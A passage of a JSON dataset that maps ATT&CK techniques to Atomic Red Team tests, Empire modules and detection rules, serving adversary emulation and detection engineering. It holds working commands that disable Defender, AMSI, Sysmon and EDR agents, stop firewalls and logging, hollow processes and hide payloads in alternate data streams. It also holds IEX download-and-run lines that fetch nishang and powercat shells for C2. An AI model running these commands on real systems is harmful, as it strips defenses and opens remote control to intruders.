$false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/disable_rdp", "ATT&CK Technique #1": "T1089", "ATT&CK Technique #2": "", "Technique": "Disabling Security Tools", "Concatenate for Python Dictionary": "\"powershell/management/disable_rdp\":  [\"T1089\"],"}}], "command_list": ["if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n", "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service rsyslog stop\n  chkconfig off rsyslog\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop rsyslog\n  systemctl disable rsyslog\nfi\n", "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "setenforce 0\n", "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n", "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n", "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl unload #{userdaemon_plist}\n", "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n", "fltmc.exe unload SysmonDrv\n", "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true\n", "sysmon -u\n", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "net.exe stop McAfeeDLPAgentService\nsc.exe config McAfeeDLPAgentService start= disabled\n", "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", "Stop-Service -Name McAfeeDLPAgentService\nRemove-Service -Name McAfeeDLPAgentService\n", "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}", {"windows": {"psh": {"command": "Set-MPPreference -DisableRealtimeMonitoring 1\n", "cleanup": "Set-MPPreference -DisableRealtimeMonitoring 0"}}}, {"windows": {"psh": {"command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n", "cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n"}}}, "powershell/management/disable_rdp", "powershell/management/disable_rdp"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"net.exe\"or process_path contains \"sc.exe\")and file_directory contains \"stop\"", "name": "Disabling Security Tools Service Stopped"}], "possible_detections": [{"data_source": {"title": "Weak Encryption Enabled and Kerberoast", "id": "f6de9536-0441-4b3f-a646-f4e00f300ffd", "description": "Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.", "references": ["https://adsecurity.org/?p=2053", "https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/"], "author": "@neu5ron", "tags": ["attack.defense_evasion", "attack.t1089"], "logsource": {"product": "windows", "service": "security", "definition": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management"}, "detection": {"selection": {"EventID": 4738}, "keywords": {"Message": ["*DES*", "*Preauth*", "*Encrypted*"]}, "filters": {"Message": ["*Enabled*"]}, "condition": "selection and keywords and filters"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1090", "commands": [{"source": "atomics/T1090/T1090.yaml", "command": "export #{proxy_scheme}_proxy=127.0.0.1:8080\n", "name": null}, {"source": "atomics/T1090/T1090.yaml", "command": "export http_proxy=#{proxy_server}\n", "name": null}, {"source": "atomics/T1090/T1090.yaml", "command": null, "name": null}, {"source": "atomics/T1090/T1090.yaml", "command": null, "name": null}, {"source": "atomics/T1090/T1090.yaml", "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=127.0.0.1", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/socks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/socks", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Connection Proxy": {"attack_technique": "T1090", "display_name": "Connection Proxy", "atomic_tests": [{"name": "Connection Proxy", "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"proxy_server": {"description": "Proxy server URL (host:port)", "type": "url", "default": "127.0.0.1:8080"}, "proxy_scheme": {"description": "Protocol to proxy (http or https)", "type": "string", "default": "http"}}, "executor": {"name": "sh", "command": "export #{proxy_scheme}_proxy=#{proxy_server}\n", "cleanup_command": "unset http_proxy\nunset https_proxy\n"}}, {"name": "portproxy reg key", "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n", "supported_platforms": ["windows"], "input_arguments": {"listenport": {"description": "Specifies the IPv4 port, by port number or service name, on which to listen.", "type": "string", "default": 1337}, "connectport": {"description": "Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer.", "type": "string", "default": 1337}, "connectaddress": {"description": "Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer.", "type": "string", "default": "127.0.0.1"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}", "cleanup_command": "netsh interface portproxy delete v4tov4 listenport=#{listenport}"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/management/multi/socks", "ATT&CK Technique #1": "T1090", "ATT&CK Technique #2": "", "Technique": "Connection Proxy", "Concatenate for Python Dictionary": "\"python/management/multi/socks\":  [\"T1090\"],"}}], "command_list": ["export #{proxy_scheme}_proxy=127.0.0.1:8080\n", "export http_proxy=#{proxy_server}\n", null, null, "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=127.0.0.1", "python/management/multi/socks", "python/management/multi/socks"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: netsh port forwarding\ndescription: windows server 2016\ntags: T1090\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ netsh.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: \"netsh interface portproxy add v4tov4 *\" # process command line arguments\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Netsh", "id": "cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c", "description": "Allow Incoming Connections by Port or Application on Windows Firewall", "references": ["https://attack.mitre.org/software/S0246/ (Lazarus HARDRAIN)", "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf"], "date": "2019/01/29", "tags": ["attack.lateral_movement", "attack.command_and_control", "attack.t1090"], "status": "experimental", "author": "Markus Neis", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*netsh firewall add*"]}, "condition": "selection"}, "falsepositives": ["Legitimate administration"], "level": "medium"}}, {"data_source": {"title": "Netsh Port Forwarding", "id": "322ed9ec-fcab-4f67-9a34-e7c6aef43614", "description": "Detects netsh commands that configure a port forwarding", "references": ["https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html"], "date": "2019/01/29", "tags": ["attack.lateral_movement", "attack.command_and_control", "attack.t1090"], "status": "experimental", "author": "Florian Roth", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["netsh interface portproxy add v4tov4 *"]}, "condition": "selection"}, "falsepositives": ["Legitimate administration"], "level": "medium"}}]}, {"technique_id": "T1093", "commands": [{"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "name": null}, {"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"C:\\Windows\\System32\\calc.exe\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "name": null}, {"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n", "name": null}, {"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Process Hollowing": {"attack_technique": "T1093", "display_name": "Process Hollowing", "atomic_tests": [{"name": "Process Hollowing using PowerShell", "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n", "supported_platforms": ["windows"], "input_arguments": {"parent_process_name": {"description": "Name of the parent process", "type": "string", "default": "explorer"}, "sponsor_binary_path": {"description": "Path of the sponsor binary (executable that will host the binary)", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}, "hollow_binary_path": {"description": "Path of the binary to hollow (executable that will run inside the sponsor)", "type": "string", "default": "C:\\Windows\\System32\\cmd.exe"}, "spawnto_process_name": {"description": "Name of the process to spawn", "type": "string", "default": "calc"}}, "executor": {"name": "powershell", "elevation_required": false, "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n"}}]}}], "command_list": [". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"C:\\Windows\\System32\\calc.exe\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n", ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"smss.exe\"and process_parent_command_line !contains \"smss.exe\")or (process_path contains \"csrss.exe\"and (process_parent_command_line !contains \"smss.exe\"or process_parent_command_line !contains \"svchost.exe\"))or (process_path contains \"wininit.exe\"and process_parent_command_line !contains \"smss.exe\")or (process_path contains \"winlogon.exe\" and process_parent_command_line !contains \"smss.exe\")or (process_path contains \"lsass.exe\" and process_parent_command_line !contains \"wininit.exe\")or (process_path contains \"LogonUI.exe\"and (process_parent_command_line !contains \"winlogon.exe\" or process_parent_command_line !contains \"wininit.exe\"))or (process_path contains \"services.exe\" and process_parent_command_line !contains \"wininit.exe\")or (process_path contains \"spoolsv.exe\" and process_parent_command_line !contains \"services.exe\")or (process_path contains \"taskhost.exe\"and (process_parent_command_line !contains \"services.exe\" or process_parent_command_line !contains \"svchost.exe\"))or (process_path contains \"taskhostw.exe\"and (process_parent_command_line !contains \"services.exe\" or process_parent_command_line !contains \"svchost.exe\"))or (process_path contains \"userinit.exe\"and (process_parent_command_line !contains \"dwm.exe\" or process_parent_command_line !contains \"winlogon.exe\"))", "name": "Process Holoowing"}], "possible_detections": []}, {"technique_id": "T1095", "commands": [{"source": "atomics/T1095/T1095.yaml", "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress 127.0.0.1\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "cmd /c #{ncat_exe} 127.0.0.1 #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": null, "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe #{server_ip} #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c 127.0.0.1 -p #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": null, "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Standard Non-Application Layer Protocol": {"attack_technique": "T1095", "display_name": "Standard Non-Application Layer Protocol", "atomic_tests": [{"name": "ICMP C2", "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "The IP address of the listening server", "type": "string", "default": "127.0.0.1"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n"}}, {"name": "Netcat C2", "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "The IP address or domain name of the listening server", "type": "string", "default": "127.0.0.1"}, "server_port": {"description": "The port for the C2 connection", "type": "integer", "default": 80}, "ncat_exe": {"description": "The location of ncat.exe", "type": "path", "default": "$env:TEMP\\T1095\\nmap-7.80\\ncat.exe"}, "ncat_path": {"description": "The folder path of ncat.exe", "type": "path", "default": "$env:TEMP\\T1095"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ncat.exe must be available at specified location (#{ncat_exe})\n", "prereq_command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory -Force -Path #{ncat_path} | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n"}}, {"name": "Powercat C2", "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "The IP address or domain name of the listening server", "type": "string", "default": "127.0.0.1"}, "server_port": {"description": "The port for the C2 connection", "type": "integer", "default": 80}}, "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n"}}]}}], "command_list": ["IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress 127.0.0.1\n", "cmd /c #{ncat_exe} 127.0.0.1 #{server_port}\n", null, "cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe #{server_ip} #{server_port}\n", "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n", "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c 127.0.0.1 -p #{server_port}\n", null], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1096", "commands": [{"source": "atomics/T1096/T1096.yaml", "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\\temp:ttt\nmakecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab\nprint /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg\nregedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat\nesentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o\n", "name": null}, {"source": "atomics/T1096/T1096.yaml", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "name": null}, {"source": "atomics/T1096/T1096.yaml", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:#{ads_name}`\"\"\n", "name": null}, {"source": "atomics/T1096/T1096.yaml", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:desktop.ini`\"\"\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - NTFS File Attributes": {"attack_technique": "T1096", "display_name": "NTFS File Attributes", "atomic_tests": [{"name": "Alternate Data Streams (ADS)", "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n", "supported_platforms": ["windows"], "input_arguments": {"path": {"description": "Path of ADS file", "type": "path", "default": "c:\\ADS\\"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o\n"}}, {"name": "Store file in Alternate Data Stream (ADS)", "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n", "supported_platforms": ["windows"], "input_arguments": {"payload_path": {"description": "Path of file to hide in ADS", "type": "path", "default": "c:\\windows\\system32\\cmd.exe"}, "ads_file_path": {"description": "Path of file to create an ADS under", "type": "path", "default": "C:\\Users\\Public\\Libraries\\yanki\\desktop.ini"}, "ads_name": {"description": "Name of ADS", "type": "string", "default": "desktop.ini"}}, "executor": {"name": "powershell", "elevation_required": false, "prereq_command": "", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "cleanup_command": "Remove-Item \"#{ads_file_path}\" -Force -ErrorAction Ignore\n"}}]}}], "command_list": ["type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\\temp:ttt\nmakecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab\nprint /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg\nregedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat\nesentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o\n", "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:#{ads_name}`\"\"\n", "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:desktop.ini`\"\"\n"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"fsutil.exe\" and process_command_line contains \"*usn*deletejournal*\"", "name": "NTFS File Attributes"}], "possible_detections": [{"data_source": {"title": "NTFS Alternate Data Stream", "id": "8c521530-5169-495d-a199-0a3a881ad24e", "status": "experimental", "description": "Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.", "references": ["http://www.powertheshell.com/ntfsstreams/"], "tags": ["attack.defense_evasion", "attack.t1096"], "author": "Sami Ruohonen", "logsource": {"product": "windows", "service": "powershell", "definition": "It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277"}, "detection": {"keyword1": ["set-content"], "keyword2": ["-stream"], "condition": "keyword1 and keyword2"}, "falsepositives": ["unknown"], "level": "high"}}]}, {"technique_id": "T1097", 